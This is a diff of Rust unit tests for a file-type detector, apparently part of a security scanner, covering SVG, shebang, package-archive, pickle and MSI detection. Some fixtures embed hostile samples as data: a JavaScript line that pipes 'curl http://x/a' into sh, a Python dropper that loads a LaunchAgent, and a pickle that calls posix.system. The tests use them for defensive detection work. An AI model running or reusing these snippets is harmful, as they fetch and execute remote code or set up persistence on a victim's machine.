     fn svg_root_needs_a_doctype_that_names_svg() {
         // The `<!DOCTYPE …>` allowance exists for `<!DOCTYPE svg PUBLIC …>`.
         // Accepting any doctype and then hunting for `<svg` in the first
         // kilobyte typed every HTML page with an inline icon as an image,
         // which skipped every HTML rule for it.
-        assert!(has_svg_root(
+        assert!(is_svg(
             b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"/>"
         ));
-        assert!(!has_svg_root(b"<!DOCTYPE html>\n<svg xmlns=\"x\"></svg>"));
+        assert!(!is_svg(b"<!DOCTYPE html>\n<svg xmlns=\"x\"></svg>"));
         // A `<?xml` prolog is still a legitimate preamble for a real SVG.
-        assert!(has_svg_root(b"<?xml version=\"1.0\"?>\n<svg xmlns=\"x\"/>"));
+        assert!(is_svg(b"<?xml version=\"1.0\"?>\n<svg xmlns=\"x\"/>"));
     }
 
     #[test]
     fn svg_root_yields_to_an_enclosing_html_element() {
         // XHTML reaches the prolog branch, so the doctype check alone does
         // not settle it. An `<html>` ahead of the `<svg>` does.
-        assert!(!has_svg_root(
+        assert!(!is_svg(
             b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>"
         ));
-        assert!(!has_svg_root(b"<!DOCTYPE svg><html><svg ></svg>"));
+        assert!(!is_svg(b"<!DOCTYPE svg><html><svg ></svg>"));
     }
 
     #[test]
     fn svg_root_ignores_a_document_with_no_svg_at_all() {
-        assert!(!has_svg_root(
-            b"<?xml version=\"1.0\"?>\n<rss version=\"2.0\">"
-        ));
-        assert!(!has_svg_root(b"plain text"));
+        assert!(!is_svg(b"<?xml version=\"1.0\"?>\n<rss version=\"2.0\">"));
+        assert!(!is_svg(b"plain text"));
     }
     use super::*;
 
@@ -1689,6 +1852,74 @@ mod tests {
         let data = b"#!/usr/bin/env node\nconsole.log('hi');\n";
         let (ft, _) = detect_from_content(Path::new("script"), data).unwrap();
         assert_eq!(ft, FileType::JavaScript);
+    }
+
+    /// Shebang lines that named their interpreter but were left untyped, so
+    /// every language-gated rule skipped the script.
+    #[test]
+    fn shebang_variants() {
+        let cases: &[(&[u8], FileType)] = &[
+            // CRLF line endings: the `\r` is not part of the interpreter name.
+            (b"#!/usr/bin/perl\r\nuse Socket;\r\n", FileType::Perl),
+            (b"#!/bin/bash\r\necho hi\r\n", FileType::Shell),
+            (b"#!/usr/bin/env python3\r\nimport os\r\n", FileType::Python),
+            (
+                b"\xEF\xBB\xBF#!/usr/bin/perl\r\nuse Socket;\r\n",
+                FileType::Perl,
+            ),
+            (b"\xEF\xBB\xBF#!/bin/bash\r\necho hi\r\n", FileType::Shell),
+            // A `/` in an argument is not the interpreter path.
+            (b"#!/usr/bin/perl -I/opt/lib\nuse Socket;\n", FileType::Perl),
+            (b"#!/bin/bash --rcfile /etc/x\necho hi\n", FileType::Shell),
+            // env is found by basename, after whitespace, with its options.
+            (b"#!/usr/local/bin/env perl\n", FileType::Perl),
+            (b"#!/bin/env ruby\n", FileType::Ruby),
+            (b"#! /usr/bin/env perl\n", FileType::Perl),
+            (b"#!/usr/bin/env -S perl -w\n", FileType::Perl),
+            (b"#!/usr/bin/env -u HOME LANG=C perl\n", FileType::Perl),
+            (b"#!/bin/busybox sh\n", FileType::Shell),
+            // Versioned interpreter names.
+            (b"#!/usr/bin/perl5.36\n", FileType::Perl),
+            (b"#!/usr/bin/python3.11\n", FileType::Python),
+            (b"#!/usr/bin/ksh93\n", FileType::Shell),
+            // Interpreters for types that already existed.
+            (b"#!/usr/bin/env pwsh\n", FileType::PowerShell),
+            (
+                b"#!/usr/bin/osascript\ndo shell script \"id\"\n",
+                FileType::AppleScript,
+            ),
+            (
+                b"#!/usr/bin/osascript -l JavaScript\nApplication('Finder')\n",
+                FileType::JavaScript,
+            ),
+        ];
+        for (data, want) in cases {
+            let got = detect_from_content(Path::new("script"), data);
+            assert_eq!(
+                got,
+                Some((*want, DetectionSource::Shebang)),
+                "{}",
+                String::from_utf8_lossy(data).escape_debug()
+            );
+        }
+    }
+
+    #[test]
+    fn shebang_without_interpreter() {
+        for data in [
+            &b"#!\n"[..],
+            b"#! \r\n",
+            b"#!/usr/bin/env\n",
+            b"#!/usr/bin/env -S\n",
+            b"#!/opt/x/unknown\n",
+        ] {
+            assert_eq!(
+                detect_shebang(data),
+                None,
+                "{}",
+                String::from_utf8_lossy(data).escape_debug()
+            );
+        }
     }
 
     #[test]
@@ -1983,7 +2214,15 @@ mod tests {
 
     #[test]
     fn freebsd_pkg_zstd_archive() {
-        let data = zstd::encode_all(&b"+COMPACT_MANIFEST\0payload"[..], 3).unwrap();
+        let data = {
+            let mut tar = tar::Builder::new(Vec::new());
+            let mut h = tar::Header::new_ustar();
+            h.set_path("+COMPACT_MANIFEST").unwrap();
+            h.set_size(7);
+            h.set_cksum();
+            tar.append(&h, &b"payload"[..]).unwrap();
+            zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
+        };
         let (ft, _) = detect_from_content(Path::new("BerkeleyGW-4.0_2.pkg"), &data).unwrap();
         assert_eq!(ft, FileType::PkgFreebsd);
     }
@@ -2043,7 +2282,7 @@ mod tests {
 
     #[test]
     fn python_sdist_pkg_info_may_follow_large_source_tree() {
-        let padding = vec![0u8; (NPM_PEEK_LIMIT as usize) + 1];
+        let padding = vec![0u8; (8 << 20) + 1];
         let gz = build_gzip_tar(&[
             ("generated-1.0/src/generated/client.py", &padding),
             ("generated-1.0/PKG-INFO", b"Name: generated\n"),
@@ -2179,14 +2418,20 @@ mod tests {
         assert_eq!(ft, FileType::Npm);
 
         // A `.tgz` without the `package/` layout stays a generic gzip tar.
-        let plain = {
+        let plain = build_gzip_tar(&[("README", b"hi"), ("src/main.c", b"int")]);
+        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &plain).unwrap();
+        assert_eq!(ft, FileType::TarGz);
+
+        // One that decodes to something other than a tar is a plain gzip,
+        // whatever it is called: the content has spoken.
+        let not_tar = {
             use std::io::Write;
             let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
             e.write_all(b"not a tar").unwrap();
             e.finish().unwrap()
         };
-        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &plain).unwrap();
-        assert_eq!(ft, FileType::TarGz);
+        let (ft, _) = detect_from_content(Path::new("blob.tgz"), &not_tar).unwrap();
+        assert_eq!(ft, FileType::Gz);
     }
 
     #[test]
@@ -2485,6 +2730,208 @@ mod tests {
     #[test]
     fn too_short_returns_none() {
         assert!(detect_from_content(Path::new("x"), b"x").is_none());
+    }
+
+    fn content_type(name: &str, data: &[u8]) -> Option<FileType> {
+        detect_from_content(Path::new(name), data).map(|(ft, _)| ft)
+    }
+
+    /// A script that opens with a binary format's first letters is still a
+    /// script: every such format carries a NUL or control byte in its header.
+    #[test]
+    fn a_short_signature_followed_by_text_is_not_that_format() {
+        let body = "=1;require('child_process').exec('curl http://x/a|sh');\n";
+        for magic in [
+            "MZ", "BM", "ID3", "OTTO", "true", "typ1", "ttcf", "wOFF", "Fasd", "hsqs", "sqsh",
+            "ITSF", "Cr24", "xar!", "Rar!", "GIF89a", "PKCS7",
+        ] {
+            let script = format!("{magic}{body}");
+            assert_eq!(content_type("a.js", script.as_bytes()), None, "{magic}");
+        }
+        assert_eq!(content_type("x", b"true\ntrue\nfalse\n"), None);
+        assert_eq!(content_type("x", b"abcdftypisom and some prose"), None);
+        // Text-header formats keep their claim.
+        assert_eq!(
+            content_type("x", b"%PDF-1.4\n1 0 obj\n<<>>\n"),
+            Some(FileType::Pdf)
+        );
+        assert_eq!(
+            content_type("x", b"REGEDIT4\r\n[HKEY_CURRENT_USER]\r\n"),
+            Some(FileType::Registry)
+        );
+        let deb = b"!<arch>\ndebian-binary   1342177295  0     0     100644  4         `\n2.0\n";
+        assert_eq!(content_type("x", deb), Some(FileType::Deb));
+    }
+
+    #[test]
+    fn python_bytecode_by_magic_number() {
+        // CPython 3.14 (3627) no longer has 0x0D as its second byte.
+        let pyc = b"\x2b\x0e\r\n\0\0\0\0\x89\x36\x29\x6a\xbe\x34\0\0\xe3\0\0\0";
+        assert_eq!(content_type("x", pyc), Some(FileType::PythonBytecode));
+        let py27 = b"\x03\xf3\r\n\xde\x1d\xef\x50c\0\0\0\0\0\0\0\0\x02\0\0\0";
+        assert_eq!(content_type("x", py27), Some(FileType::PythonBytecode));
+        // Text whose first line is one character, re-converted to CR CR LF.
+        assert_eq!(content_type("x", b"{\r\r\n\"a\": 1\r\r\n}\r\r\n"), None);
+    }
+
+    #[test]
+    fn lockfiles_by_header_not_by_mention() {
+        let yarn = b"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\nleft-pad@^1.3.0:\n";
+        assert_eq!(
+            content_type("yarn.abc123.lock", yarn),
+            Some(FileType::YarnLock)
+        );
+        let cargo = b"# This file is automatically @generated by Cargo.\n# It is not intended for manual editing.\nversion = 4\n";
+        assert_eq!(content_type("x", cargo), Some(FileType::CargoLock));
+        let poetry = b"# This file is automatically @generated by Poetry 1.8.3 and should not be changed by hand.\n\n[[package]]\n";
+        assert_eq!(content_type("x", poetry), Some(FileType::PoetryLock));
+        assert_eq!(
+            content_type("x", b"lockfileVersion: '9.0'\n\nimporters:\n"),
+            Some(FileType::PnpmLock)
+        );
+        // Source that writes a yarn header is source.
+        let js = b"const header = '# THIS IS AN AUTOGENERATED FILE.\\n# yarn lockfile v1\\n';\nrequire('child_process').exec(x);\n";
+        assert_eq!(content_type("x", js), None);
+    }
+
+    #[test]
+    fn markup_is_typed_by_its_root_element() {
+        // A dropper that writes a LaunchAgent is the language it is written in.
+        let dropper = b"import os\np = '''<?xml version=\"1.0\"?>\n<plist version=\"1.0\"><dict/></plist>'''\nos.system('launchctl load x')\n";
+        assert_eq!(content_type("x.py", dropper), None);
+        let plist = b"\xEF\xBB\xBF<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"x\">\n<plist version=\"1.0\"><dict/></plist>";
+        assert_eq!(content_type("x", plist), Some(FileType::Plist));
+        let svg = b"<!-- Created with Inkscape -->\n<svg\n\txmlns=\"http://www.w3.org/2000/svg\"/>";
+        assert_eq!(content_type("x", svg), Some(FileType::Svg));
+        let resx = b"\xEF\xBB\xBF<?xml version=\"1.0\"?>\n<root><xsd:schema/></root>";
+        assert_eq!(content_type("x", resx), Some(FileType::Xml));
+    }
+
+    #[test]
+    fn pickles_by_frame_or_torch_magic_whatever_the_name() {
+        let proto5 = b"\x80\x05\x95\x1b\0\0\0\0\0\0\0\x8c\x05posix\x94\x8c\x06system\x94\x93\x94.";
+        assert_eq!(content_type("model.bin", proto5), Some(FileType::Pickle));
+        let torch = b"\x80\x02\x8a\x0a\x6c\xfc\x9c\x46\xf9\x20\x6a\xa8\x50\x19.\x80\x02M\xe9\x03.";
+        assert_eq!(content_type("weights", torch), Some(FileType::Pickle));
+        // Protocol 2 opens with two bytes other formats share; the name decides.
+        let proto2 = b"\x80\x02}q\0(X\x01\0\0\0aq\x01K\x01u.";
+        assert_eq!(content_type("x.pkl", proto2), Some(FileType::Pickle));
+        assert_eq!(content_type("x.bin", proto2), None);
+    }
+
+    fn build_zstd_tar(members: &[(&str, &[u8])]) -> Vec<u8> {
+        zstd::encode_all(&build_plain_tar(members)[..], 3).unwrap()
+    }
+
+    #[test]
+    fn tar_packages_by_layout_whatever_the_name() {
+        let gem = build_plain_tar(&[
+            ("metadata.gz", b"x"),
+            ("data.tar.gz", b"x"),
+            ("checksums.yaml.gz", b"x"),
+        ]);
+        assert_eq!(content_type("blob", &gem), Some(FileType::Gem));
+        let gpkg = build_plain_tar(&[("foo-1.0/gpkg-1", b""), ("foo-1.0/image.tar", b"")]);
+        assert_eq!(content_type("blob", &gpkg), Some(FileType::GentooBinpkg));
+        let krate = build_gzip_tar(&[
+            ("foo-1.0/Cargo.toml", b"[package]"),
+            ("foo-1.0/Cargo.toml.orig", b""),
+        ]);
+        assert_eq!(content_type("blob", &krate), Some(FileType::Crate));
+        let alpine = build_gzip_tar(&[(".SIGN.RSA.builder.rsa.pub", b"sig")]);
+        assert_eq!(content_type("blob", &alpine), Some(FileType::ApkAlpine));
+        let xbps = build_zstd_tar(&[("./props.plist", b"<plist/>"), ("./files.plist", b"")]);
+        assert_eq!(content_type("blob", &xbps), Some(FileType::Xbps));
+        let arch = build_zstd_tar(&[
+            (".BUILDINFO", b""),
+            (".MTREE", b""),
+            (".PKGINFO", b""),
+            ("usr/bin/x", b""),
+        ]);
+        assert_eq!(content_type("blob", &arch), Some(FileType::PkgArch));
+        // A layout that needs a different codec is only the generic tar.
+        let zstd_npm = build_zstd_tar(&[("package/package.json", b"{}")]);
+        assert_eq!(content_type("blob", &zstd_npm), Some(FileType::TarZst));
+    }
+
+    #[test]
+    fn zip_packages_by_member_whatever_the_name() {
+        for (entries, want) in [
+            (
+                &[
+                    ("META-INF/MANIFEST.MF", &b"Main-Class: a.Main"[..]),
+                    ("a/Main.class", b""),
+                ][..],
+                FileType::Jar,
+            ),
+            (
+                &[
+                    ("foo/__init__.py", &b""[..]),
+                    ("foo-1.0.dist-info/WHEEL", b""),
+                ][..],
+                FileType::Whl,
+            ),
+            (
+                &[
+                    ("[Content_Types].xml", &b"<Types/>"[..]),
+                    ("Foo.nuspec", b"<package/>"),
+                ][..],
+                FileType::Nupkg,
+            ),
+            (
+                &[("Payload/Foo.app/Info.plist", &b""[..])][..],
+                FileType::Ipa,
+            ),
+            (&[("EGG-INFO/PKG-INFO", &b""[..])][..], FileType::Egg),
+            (
+                &[("manifest.json", &b"{}"[..]), ("META-INF/mozilla.rsa", b"")][..],
+                FileType::Xpi,
+            ),
+            (
+                &[("metadata.json", &b"{}"[..]), ("info-foo-1.0.tar.zst", b"")][..],
+                FileType::Conda,
+            ),
+        ] {
+            assert_eq!(
+                classify_pk(Path::new("blob"), &zip_of(entries)).0,
+                want,
+                "{want:?}"
+            );
+        }
+        // A manifest merely mentioned in a stored member is not a VSIX.
+        let mention = zip_of(&[("notes.txt", b"see extension.vsixmanifest")]);
+        assert_eq!(classify_pk(Path::new("blob"), &mention).0, FileType::Zip);
+    }
+
+    #[test]
+    fn asar_lzma_and_msi_by_structure() {
+        let json = br#"{"files":{"main.js":{"size":5,"offset":"0"}}}"#;
+        let mut asar = [
+            4u32,
+            json.len() as u32 + 8,
+            json.len() as u32 + 4,
+            json.len() as u32,
+        ]
+        .iter()
+        .flat_map(|n| n.to_le_bytes())
+        .collect::<Vec<_>>();
+        asar.extend_from_slice(json);
+        assert_eq!(content_type("app", &asar), Some(FileType::Asar));
+
+        let lzma = b"\x5d\0\0\x80\0\xff\xff\xff\xff\xff\xff\xff\xff\0\x3b\x9d";
+        assert_eq!(content_type("blob", lzma), Some(FileType::Lzma));
+        // Chromium `.pak`: a plausible dictionary and size, but no 0x5D.
+        let pak = b"\x05\0\0\0\x01\0\0\0\0\0\0\0\0\0\x12\0\0\0";
+        assert_ne!(content_type("locale.pak", pak), Some(FileType::Lzma));
+
+        let mut ole = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec();
+        ole.resize(1024 + 0x60, 0);
+        ole[0x1E] = 9; // 512-byte sectors
+        ole[0x30..0x34].copy_from_slice(&0u32.to_le_bytes()); // directory at sector 0
+        ole[512 + 0x50..512 + 0x60].copy_from_slice(&MSI_CLSIDS[0]);
+        assert_eq!(content_type("setup.bin", &ole), Some(FileType::Msi));
+        ole[512 + 0x50..512 + 0x60].fill(0);
+        assert_eq!(content_type("setup.msi", &ole), Some(FileType::OleDoc));
     }
 }
 
